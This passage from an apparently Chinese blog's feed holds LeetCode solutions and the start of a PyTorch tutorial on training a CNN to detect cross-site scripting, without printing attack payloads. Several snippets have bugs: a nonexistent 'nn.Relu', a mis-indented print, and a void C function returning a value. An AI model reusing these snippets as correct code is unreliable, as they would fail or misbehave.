class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool canWinNim(int n) &#123;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">4</span>!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> true;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反转字符串-easy"><a href="#反转字符串-easy" class="headerlink" title="反转字符串(easy)"></a>反转字符串(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void reverseString(char* s, int sSize) &#123;</span><br><span class="line">    int temp;</span><br><span class="line">    int i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;sSize/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        temp=s[i];</span><br><span class="line">        s[i]=s[sSize-i<span class="number">-1</span>];</span><br><span class="line">        s[sSize-i<span class="number">-1</span>]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反转字符串中的单词III-easy"><a href="#反转字符串中的单词III-easy" class="headerlink" title="反转字符串中的单词III(easy)"></a>反转字符串中的单词III(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseWords</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">" "</span>.join(i[::<span class="number">-1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> s.split())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># res = ""</span></span><br><span class="line">        <span class="comment"># s1 = list(s.split(" "))</span></span><br><span class="line">        <span class="comment"># for i in range(len(s1)-1):</span></span><br><span class="line">        <span class="comment">#     res+=s1[i][::-1]</span></span><br><span class="line">        <span class="comment">#     res+=" "</span></span><br><span class="line">        <span class="comment"># res+=s1[-1][::-1]</span></span><br><span class="line">        <span class="comment"># return res</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;两数相加-medium&quot;&gt;&lt;a href=&quot;#两数相加-medium&quot; class=&quot;headerlink&quot; title=&quot;两数相加(medium)&quot;&gt;&lt;/a&gt;两数相加(medium)&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;t
      
    
    </summary>
    
    
      <category term="数据结构与算法" scheme="elssm.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第52场双周赛write up</title>
    <link href="elssm.github.io/2021/05/16/Leetcode%E7%AC%AC52%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/05/16/Leetcode第52场双周赛write-up/</id>
    <published>2021-05-16T04:41:36.000Z</published>
    <updated>2021-05-16T09:16:06.150Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h4 id="将句子排序"><a href="#将句子排序" class="headerlink" title="将句子排序"></a>将句子排序</h4><p>第一步就是将句子进行分割，分割之后存在列表中，因为分割之后每个单词后面都有对应的数字，而且数字是唯一的，因此可以通过字典对数字进行排序，排序之后根据字典的key遍历即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortSentence</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        s1=<span class="string">""</span></span><br><span class="line">        res = s.split(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            d[int(i[<span class="number">-1</span>])] = i[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> d.keys():</span><br><span class="line">            s1+=d[i]</span><br><span class="line">            s1+=<span class="string">" "</span></span><br><span class="line">        <span class="keyword">return</span> s1[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></li><li><h4 id="增长的内存泄露"><a href="#增长的内存泄露" class="headerlink" title="增长的内存泄露"></a>增长的内存泄露</h4><p>首先需要设定一个不断增长的内存数，之后需要思考一下循环退出条件，即当内存数都大于两个内存条的可用内存时就退出。在循环中需要用较大的可用内存条数减去当前的内存数，最后通过一个列表接受三个值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">memLeak</span><span class="params">(self, memory1, memory2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type memory1: int</span></span><br><span class="line"><span class="string">        :type memory2: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;=memory1 <span class="keyword">or</span> i&lt;=memory2:</span><br><span class="line">            <span class="keyword">if</span> memory1&gt;=memory2:</span><br><span class="line">                memory1-=i</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                memory2-=i</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        res.append(i)</span><br><span class="line">        res.append(memory1)</span><br><span class="line">        res.append(memory2)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></li><li><h4 id="旋转盒子"><a href="#旋转盒子" class="headerlink" title="旋转盒子"></a>旋转盒子</h4><p>此题可以先在旋转之间将字符的改变位置设定好，最后再进行一次顺时针旋转即可。具体是对矩阵的每一行进行单独操作，遍历每一行，如果是石头则累计石头的个数，如果遇到障碍物，则将石头的个数清零，如果遇到空位置，则需要将前面累计的石头一次延续到这个空位置，并将前面累计的第一个石头的位置设为空位置。最后将矩阵进行一次顺时针旋转即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rotateTheBox</span><span class="params">(self, box)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type box: List[List[str]]</span></span><br><span class="line"><span class="string">        :rtype: List[List[str]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> box:</span><br><span class="line">            count=<span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(i)):</span><br><span class="line">                <span class="keyword">if</span> i[j]==<span class="string">"#"</span>:</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> i[j]==<span class="string">"*"</span>:</span><br><span class="line">                    count=<span class="number">0</span></span><br><span class="line">                <span class="keyword">elif</span> i[j]==<span class="string">"."</span>:</span><br><span class="line">                    <span class="keyword">if</span> count!=<span class="number">0</span>:</span><br><span class="line">                        i[j-count]=<span class="string">"."</span></span><br><span class="line">                        i[j]=<span class="string">"#"</span></span><br><span class="line">        box[::] = zip(*box[::<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> box</span><br></pre></td></tr></table></figure></li><li><h4 id="向下取整数对和"><a href="#向下取整数对和" class="headerlink" title="向下取整数对和"></a>向下取整数对和</h4><p>排序后进行二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sumOfFlooredPairs</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        mod = <span class="number">1000000007</span></span><br><span class="line">        nums = sorted(nums)</span><br><span class="line">        n = len(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            j=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> nums[i] * j &lt;= nums[n<span class="number">-1</span>]: <span class="comment">#判断是否小于最大值</span></span><br><span class="line">                start = self.binarySearch(nums, nums[i] * j) <span class="comment">#找到大于等于nums[i] * j的下标</span></span><br><span class="line">                ans = (ans + n - start) % mod</span><br><span class="line">                j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(self,nums,x)</span>:</span></span><br><span class="line">        l,r= <span class="number">0</span>,len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> l &lt; r :</span><br><span class="line">            mid = (l+(r<span class="number">-1</span>))//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid] &gt;= x:</span><br><span class="line">                r=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;h4 id=&quot;将句子排序&quot;&gt;&lt;a href=&quot;#将句子排序&quot; class=&quot;headerlink&quot; title=&quot;将句子排序&quot;&gt;&lt;/a&gt;将句子排序&lt;/h4&gt;&lt;p&gt;第一步就是将句子进行分割，分割之后存在列表中，因为分割之后每个单词后面都有对应的数字，而且数字是唯
      
    
    </summary>
    
    
      <category term="算法" scheme="elssm.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>CNN检测XSS攻击(Pytorch)</title>
    <link href="elssm.github.io/2021/04/23/CNN%E6%A3%80%E6%B5%8BXSS%E6%94%BB%E5%87%BB-Pytorch/"/>
    <id>elssm.github.io/2021/04/23/CNN检测XSS攻击-Pytorch/</id>
    <published>2021-04-23T05:08:36.000Z</published>
    <updated>2021-04-24T09:33:41.582Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前在Kaggle上看到了一个XSS的数据集，所以想着用pytorch实现一下，代码参考了kaggle上有人用keras实现的。</p><p><a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-attack-detection-using-cnn</a></p><h3 id="XSS数据集介绍"><a href="#XSS数据集介绍" class="headerlink" title="XSS数据集介绍"></a>XSS数据集介绍</h3><p>数据集地址：<a href="https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning" target="_blank" rel="noopener">https://www.kaggle.com/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning</a></p><p>数据是csv形式的，一共有三列，第一列是序号，第二列是具体的代码，第三列是标签。一共有13686条数据，没有分训练集和测试集，因此后面我们需要分一下。</p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>首先我们应该对数据进行编码。转换成向量的形式，对于训练集和测试集每一行数据，我们都有编码和标签两种数据，之后通过模型进行训练，训练结果与标签进行比对，计算损失，最后通过测试集进行验证。</p><h4 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h4><p>其中cv2是一个进行图像处理的库，sklearn是基于python的机器学习攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br></pre></td></tr></table></figure><h4 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">50</span></span><br><span class="line">epochs = <span class="number">100</span></span><br></pre></td></tr></table></figure><h4 id="加载数据集"><a href="#加载数据集" class="headerlink" title="加载数据集"></a>加载数据集</h4><p>将XSS数据集下载之后，放在和代码同级的目录下。通过pandas模块可以实现对csv文件的读取等操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df = pd.read_csv(<span class="string">"XSS_dataset.csv"</span>,encoding=<span class="string">"utf-8-sig"</span>)</span><br><span class="line">sentences = df[<span class="string">'Sentence'</span>].values</span><br></pre></td></tr></table></figure><h4 id="定义编码函数"><a href="#定义编码函数" class="headerlink" title="定义编码函数"></a>定义编码函数</h4><p>对于一些编码后比较大的字符，可以为他们分配一个比较小的值，方便后续进行正则化。将每一条数据都通过一个长度为10000的向量进行存储。之后<code>reshape</code>成一个二维向量，大小是100*100</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_to_ascii</span><span class="params">(sentence)</span>:</span></span><br><span class="line">    sentence_ascii = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sentence:</span><br><span class="line">        <span class="keyword">if</span> (ord(i) &lt; <span class="number">8222</span>):  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">134</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8221</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">129</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8220</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">130</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8216</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8217</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">132</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) == <span class="number">8211</span>):  </span><br><span class="line">                sentence_ascii.append(<span class="number">133</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ord(i) &lt;= <span class="number">128</span>):</span><br><span class="line">                sentence_ascii.append(ord(i))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    zer = np.zeros((<span class="number">10000</span>)) <span class="comment">#初始化一个长度为10000的向量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentence_ascii)):</span><br><span class="line">        zer[i] = sentence_ascii[i]</span><br><span class="line">    zer.shape = (<span class="number">100</span>, <span class="number">100</span>) <span class="comment">#将一维转为二维</span></span><br><span class="line">    <span class="keyword">return</span> zer</span><br></pre></td></tr></table></figure><h4 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h4><p>首先定一个数组，大小是数据集的长度，类型是一个二维向量，大小是100*100，之后对csv中每一条数据都进行编码转换，并将二维向量中的数据都转为float类型表示。之后得到的data就是对数据集编码后的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arr = np.zeros((len(sentences), <span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sentences)):</span><br><span class="line">    image = convert_to_ascii(sentences[i])</span><br><span class="line"></span><br><span class="line">    x = np.asarray(image, dtype=<span class="string">'float'</span>) <span class="comment">#将二维里的数据类型转为float型</span></span><br><span class="line">    image = cv2.resize(x, dsize=(<span class="number">100</span>, <span class="number">100</span>), interpolation=cv2.INTER_CUBIC)</span><br><span class="line">    image /= <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    arr[i] = image</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reshape data for input to CNN</span></span><br><span class="line">data = arr.reshape(arr.shape[<span class="number">0</span>],<span class="number">1</span>,<span class="number">100</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="获取标签"><a href="#获取标签" class="headerlink" title="获取标签"></a>获取标签</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y=df[<span class="string">'Label'</span>].values</span><br></pre></td></tr></table></figure><h4 id="划分数据集"><a href="#划分数据集" class="headerlink" title="划分数据集"></a>划分数据集</h4><p>采用<code>train_test_split</code>函数随机划分数据。其中<code>test_size</code>是指测试数据占样本数据的比例，这里取样本总数的20%作为测试数据，<code>random_state</code>是一个随机数种子。之后通过<code>DataLoader</code>函数设定训练批次大小和<code>shuffle</code>操作，这里需要注意的是，因为我们data和y中的数据都是<code>ndarray</code>类型的，因此我们还需要对他们进行类型转换，转为<code>tensor</code>类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trainX, testX, trainY, testY = train_test_split(data,y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">trainX = torch.from_numpy(trainX)</span><br><span class="line">trainX = DataLoader(trainX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testX = torch.from_numpy(testX)</span><br><span class="line">testX = DataLoader(testX,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">trainY = torch.from_numpy(trainY)</span><br><span class="line">trainY = DataLoader(trainY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br><span class="line">testY = torch.from_numpy(testY)</span><br><span class="line">testY = DataLoader(testY,batch_size=batch_size,shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="模型定义"><a href="#模型定义" class="headerlink" title="模型定义"></a>模型定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNN_XSS_Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(CNN_XSS_Net, self).__init__()</span><br><span class="line">        self.cnn = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>,<span class="number">64</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>,<span class="number">128</span>,<span class="number">3</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.Conv2d(<span class="number">128</span>,<span class="number">256</span>,<span class="number">3</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.3</span>),</span><br><span class="line">            nn.Relu(),</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">123904</span>,<span class="number">256</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">256</span>,<span class="number">128</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        self.fc4 = nn.Linear(<span class="number">64</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self,x)</span>:</span></span><br><span class="line">        x = torch.tensor(x, dtype=torch.float32)</span><br><span class="line">        cnn_res = self.cnn(x)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*256*22*22</span></span><br><span class="line">        cnn_res = cnn_res.view(cnn_res.size(<span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># print(cnn_res.shape) #128*123904</span></span><br><span class="line">        f1 = self.fc1(cnn_res)</span><br><span class="line">        f2 = self.fc2(f1)</span><br><span class="line">        f3 = self.fc3(f2)</span><br><span class="line">        f4 = self.fc4(f3)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> f4</span><br></pre></td></tr></table></figure><h4 id="实例化模型"><a href="#实例化模型" class="headerlink" title="实例化模型"></a>实例化模型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">model = CNN_XSS_Net()</span><br><span class="line">optimizer = optim.Adam(model.parameters(),<span class="number">0.001</span>)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br></pre></td></tr></table></figure><h4 id="定义训练函数"><a href="#定义训练函数" class="headerlink" title="定义训练函数"></a>定义训练函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(model,trainX,trainY,optimizer,epochs)</span>:</span></span><br><span class="line">    model.train()</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> data, target <span class="keyword">in</span> zip(trainX,trainY):</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        output = model(data)</span><br><span class="line">        loss = criterion(output, target)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Train Epoch : &#123;&#125; \t Loss : &#123;:.6f&#125;"</span>.format(epochs, loss.item()))</span><br></pre></td></tr></table></figure><h4 id="定义测试函数"><a href="#定义测试函数" class="headerlink" title="定义测试函数"></a>定义测试函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_model</span><span class="params">(model,testX,testY)</span>:</span></span><br><span class="line">    model.eval()</span><br><span class="line">    correct = <span class="number">0.0</span></span><br><span class="line">    test_loss = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> data,target <span class="keyword">in</span> zip(testX,testY):</span><br><span class="line">            output = model(data)</span><br><span class="line">            test_loss+=F.cross_entropy(output,target).item()</span><br><span class="line">            pred = output.max(<span class="number">1</span>,keepdim=<span class="literal">True</span>)[<span class="number">1</span>] </span><br><span class="line">            correct += pred.eq(target.view_as(pred)).sum().item()</span><br><span class="line">        test_loss /= len(testX.dataset)</span><br><span class="line">        print(<span class="string">"Test ---- Average loss : &#123;:.4f&#125;,Accuracy : &#123;:.3f&#125;\n"</span>.format(test_loss,<span class="number">100.0</span>*correct/len(testX.dataset)))</span><br></pre></td></tr></table></figure><h4 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 